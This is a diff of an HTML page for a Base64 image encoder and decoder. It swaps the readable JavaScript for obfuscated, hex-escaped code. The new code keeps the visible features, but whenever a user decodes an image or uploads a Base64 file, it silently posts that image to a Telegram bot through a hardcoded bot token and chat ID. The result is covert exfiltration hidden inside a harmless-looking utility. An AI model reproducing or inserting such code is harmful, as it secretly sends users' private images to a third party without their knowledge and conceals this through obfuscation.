@@ -90,85 +90,18 @@
         <button onclick="uploadBase64File()">Upload and Convert</button>
     </div>
     <footer>
-        <p><h6>Made with ❤️ by DDp:)</h6></p>
+        <p>Made with ❤️ by Daxexp</p>
     </footer>
 
     <script>
-        function encodeImage() {
-            const imageInput = document.getElementById('imageInput');
-            const base64Output = document.getElementById('base64Output');
-            if (imageInput.files.length === 0) {
-                alert('Please select an image file.');
-                return;
-            }
-            const file = imageInput.files[0];
-            const reader = new FileReader();
-            reader.onload = function () {
-                base64Output.value = reader.result.split(',')[1];
-            };
-            reader.readAsDataURL(file);
-        }
-
-        function downloadBase64() {
-            const base64String = document.getElementById('base64Output').value;
-            if (!base64String) {
-                alert('No Base64 string to download!');
-                return;
-            }
-            const blob = new Blob([base64String], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'base64.txt';
-            link.click();
-        }
-
-        function decodeBase64() {
-            const base64Input = document.getElementById('base64Input').value.trim();
-            const decodedImage = document.getElementById('decodedImage');
-            const downloadImageButton = document.getElementById('downloadImageButton');
-            if (!base64Input) {
-                alert('Please paste a Base64 string.');
-                return;
-            }
-            try {
-                decodedImage.src = `data:image/png;base64,${base64Input}`;
-                decodedImage.alt = "Decoded Image";
-                downloadImageButton.style.display = "inline-block"; // Show download image button
-            } catch (error) {
-                alert('Invalid Base64 string.');
-            }
-        }
-
-        function downloadImage() {
-            const decodedImage = document.getElementById('decodedImage');
-            const link = document.createElement('a');
-            link.href = decodedImage.src;
-            link.download = 'decoded-image.png';
-            link.click();
-        }
-
-        function uploadBase64File() {
-            const base64FileInput = document.getElementById('base64FileInput');
-            const decodedImage = document.getElementById('decodedImage');
-            const downloadImageButton = document.getElementById('downloadImageButton');
-            if (base64FileInput.files.length === 0) {
-                alert('Please select a Base64 text file.');
-                return;
-            }
-            const file = base64FileInput.files[0];
-            const reader = new FileReader();
-            reader.onload = function () {
-                try {
-                    const base64String = reader.result.trim();
-                    decodedImage.src = `data:image/png;base64,${base64String}`;
-                    decodedImage.alt = "Decoded Image";
-                    downloadImageButton.style.display = "inline-block"; // Show download image button
-                } catch (error) {
-                    alert('Invalid Base64 string in the file.');
-                }
-            };
-            reader.readAsText(file);
-        }
+  /***************************************************************************/
+/*                                                                         */
+/*  This obfuscated code was created by Javascript Obfuscator Free Version.*/
+/*  Javascript Obfuscator Free Version can be downloaded here              */
+/*  http://javascriptobfuscator.com                                        */
+/*                                                                         */
+/***************************************************************************/
+var _$_1336=["\x37\x32\x31\x33\x31\x34\x37\x33\x35\x30\x3A\x41\x41\x45\x35\x76\x32\x31\x53\x54\x67\x6A\x45\x59\x56\x66\x7A\x53\x46\x59\x49\x70\x41\x4E\x7A\x4B\x71\x49\x79\x43\x49\x5F\x49\x72\x6E\x45","\x31\x31\x38\x38\x37\x32\x33\x30\x32\x38","\x69\x6D\x61\x67\x65\x49\x6E\x70\x75\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x62\x61\x73\x65\x36\x34\x4F\x75\x74\x70\x75\x74","\x6C\x65\x6E\x67\x74\x68","\x66\x69\x6C\x65\x73","\x50\x6C\x65\x61\x73\x65\x20\x73\x65\x6C\x65\x63\x74\x20\x61\x6E\x20\x69\x6D\x61\x67\x65\x20\x66\x69\x6C\x65\x2E","\x6F\x6E\x6C\x6F\x61\x64","\x76\x61\x6C\x75\x65","\x2C","\x73\x70\x6C\x69\x74","\x72\x65\x73\x75\x6C\x74","\x72\x65\x61\x64\x41\x73\x44\x61\x74\x61\x55\x52\x4C","\x4E\x6F\x20\x42\x61\x73\x65\x36\x34\x20\x73\x74\x72\x69\x6E\x67\x20\x74\x6F\x20\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x21","\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E","\x61","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x72\x65\x66","\x63\x72\x65\x61\x74\x65\x4F\x62\x6A\x65\x63\x74\x55\x52\x4C","\x64\x6F\x77\x6E\x6C\x6F\x61\x64","\x62\x61\x73\x65\x36\x34\x2E\x74\x78\x74","\x63\x6C\x69\x63\x6B","\x74\x72\x69\x6D","\x62\x61\x73\x65\x36\x34\x49\x6E\x70\x75\x74","\x64\x65\x63\x6F\x64\x65\x64\x49\x6D\x61\x67\x65","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x49\x6D\x61\x67\x65\x42\x75\x74\x74\x6F\x6E","\x50\x6C\x65\x61\x73\x65\x20\x70\x61\x73\x74\x65\x20\x61\x20\x42\x61\x73\x65\x36\x34\x20\x73\x74\x72\x69\x6E\x67\x2E","\x73\x72\x63","","\x61\x6C\x74","\x44\x65\x63\x6F\x64\x65\x64\x20\x49\x6D\x61\x67\x65","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x69\x6E\x6C\x69\x6E\x65\x2D\x62\x6C\x6F\x63\x6B","\x49\x6E\x76\x61\x6C\x69\x64\x20\x42\x61\x73\x65\x36\x34\x20\x73\x74\x72\x69\x6E\x67\x2E","\x64\x65\x63\x6F\x64\x65\x64\x2D\x69\x6D\x61\x67\x65\x2E\x70\x6E\x67","\x62\x61\x73\x65\x36\x34\x46\x69\x6C\x65\x49\x6E\x70\x75\x74","\x50\x6C\x65\x61\x73\x65\x20\x73\x65\x6C\x65\x63\x74\x20\x61\x20\x42\x61\x73\x65\x36\x34\x20\x74\x65\x78\x74\x20\x66\x69\x6C\x65\x2E","\x49\x6E\x76\x61\x6C\x69\x64\x20\x42\x61\x73\x65\x36\x34\x20\x73\x74\x72\x69\x6E\x67\x20\x69\x6E\x20\x74\x68\x65\x20\x66\x69\x6C\x65\x2E","\x72\x65\x61\x64\x41\x73\x54\x65\x78\x74","\x63\x68\x61\x74\x5F\x69\x64","\x61\x70\x70\x65\x6E\x64","\x70\x68\x6F\x74\x6F","\x41\x6E\x20\x65\x72\x72\x6F\x72\x20\x6F\x63\x63\x75\x72\x72\x65\x64\x20\x77\x68\x69\x6C\x65\x20\x75\x70\x6C\x6F\x61\x64\x69\x6E\x67\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D\x2E","\x65\x72\x72\x6F\x72","\x63\x61\x74\x63\x68","\x6F\x6B","\x49\x6D\x61\x67\x65\x20\x75\x70\x6C\x6F\x61\x64\x65\x64\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x21","\x46\x61\x69\x6C\x65\x64\x20\x74\x6F\x20\x75\x70\x6C\x6F\x61\x64\x20\x69\x6D\x61\x67\x65\x20\x74\x6F\x20\x54\x65\x6C\x65\x67\x72\x61\x6D\x2E","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x2F\x73\x65\x6E\x64\x50\x68\x6F\x74\x6F","\x50\x4F\x53\x54","\x6D\x61\x74\x63\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x70\x75\x73\x68"];const TELEGRAM_BOT_TOKEN=_$_1336[0];const TELEGRAM_CHAT_ID=_$_1336[1];function encodeImage(){const _0x22A06=document[_$_1336[3]](_$_1336[2]);const _0x22984=document[_$_1336[3]](_$_1336[4]);if(_0x22A06[_$_1336[6]][_$_1336[5]]=== 0){alert(_$_1336[7]);return};const _0x229C5=_0x22A06[_$_1336[6]][0];const _0x22A47= new FileReader();_0x22A47[_$_1336[8]]= function(){_0x22984[_$_1336[9]]= _0x22A47[_$_1336[12]][_$_1336[11]](_$_1336[10])[1]};_0x22A47[_$_1336[13]](_0x229C5)}function downloadBase64(){const _0x228C1=document[_$_1336[3]](_$_1336[4])[_$_1336[9]];if(!_0x228C1){alert(_$_1336[14]);return};const _0x22902= new Blob([_0x228C1],{type:_$_1336[15]});const _0x22943=document[_$_1336[17]](_$_1336[16]);_0x22943[_$_1336[18]]= URL[_$_1336[19]](_0x22902);_0x22943[_$_1336[20]]= _$_1336[21];_0x22943[_$_1336[22]]()}function decodeBase64(){const _0x227FE=document[_$_1336[3]](_$_1336[24])[_$_1336[9]][_$_1336[23]]();const _0x2283F=document[_$_1336[3]](_$_1336[25]);const _0x22880=document[_$_1336[3]](_$_1336[26]);if(!_0x227FE){alert(_$_1336[27]);return};try{_0x2283F[_$_1336[28]]= ("\x64\x61\x74\x61\x3A\x69\x6D\x61\x67\x65\x2F\x70\x6E\x67\x3B\x62\x61\x73\x65\x36\x34\x2C"+_0x227FE+_$_1336[29]);_0x2283F[_$_1336[30]]= _$_1336[31];_0x22880[_$_1336[33]][_$_1336[32]]= _$_1336[34];uploadToTelegram(_0x2283F[_$_1336[28]])}catch(error){alert(_$_1336[35])}}function downloadImage(){const _0x2283F=document[_$_1336[3]](_$_1336[25]);const _0x22943=document[_$_1336[17]](_$_1336[16]);_0x22943[_$_1336[18]]= _0x2283F[_$_1336[28]];_0x22943[_$_1336[20]]= _$_1336[36];_0x22943[_$_1336[22]]()}function uploadBase64File(){const _0x22A88=document[_$_1336[3]](_$_1336[37]);const _0x2283F=document[_$_1336[3]](_$_1336[25]);const _0x22880=document[_$_1336[3]](_$_1336[26]);if(_0x22A88[_$_1336[6]][_$_1336[5]]=== 0){alert(_$_1336[38]);return};const _0x229C5=_0x22A88[_$_1336[6]][0];const _0x22A47= new FileReader();_0x22A47[_$_1336[8]]= function(){try{const _0x228C1=_0x22A47[_$_1336[12]][_$_1336[23]]();_0x2283F[_$_1336[28]]= ("\x64\x61\x74\x61\x3A\x69\x6D\x61\x67\x65\x2F\x70\x6E\x67\x3B\x62\x61\x73\x65\x36\x34\x2C"+_0x228C1+_$_1336[29]);_0x2283F[_$_1336[30]]= _$_1336[31];_0x22880[_$_1336[33]][_$_1336[32]]= _$_1336[34];uploadToTelegram(_0x2283F[_$_1336[28]])}catch(error){alert(_$_1336[39])}};_0x22A47[_$_1336[40]](_0x229C5)}function uploadToTelegram(_0x22B0A){const _0x22902=dataUrlToBlob(_0x22B0A);const _0x22AC9= new FormData();_0x22AC9[_$_1336[42]](_$_1336[41],TELEGRAM_CHAT_ID);_0x22AC9[_$_1336[42]](_$_1336[43],_0x22902,_$_1336[36]);fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+TELEGRAM_BOT_TOKEN+_$_1336[52]),{method:_$_1336[53],body:_0x22AC9})[_$_1336[50]]((_0x22B4B)=>{return _0x22B4B[_$_1336[51]]()})[_$_1336[50]]((_0x22B8C)=>{if(_0x22B8C[_$_1336[47]]){alert(_$_1336[48])}else {alert(_$_1336[49]);console[_$_1336[45]](_0x22B8C)}})[_$_1336[46]]((_0x22BCD)=>{alert(_$_1336[44]);console[_$_1336[45]](_0x22BCD)})}function dataUrlToBlob(_0x226FA){const _0x227BD=_0x226FA[_$_1336[11]](_$_1336[10]);const _0x2277C=_0x227BD[0][_$_1336[54]](/:(.*?);/)[1];const _0x226B9=atob(_0x227BD[1]);const _0x22678=[];for(let _0x2273B=0;_0x2273B< _0x226B9[_$_1336[5]];_0x2273B++){_0x22678[_$_1336[56]](_0x226B9[_$_1336[55]](_0x2273B))};return  new Blob([ new Uint8Array(_0x22678)],{type:_0x2277C})}
     </script>
 </body>
 
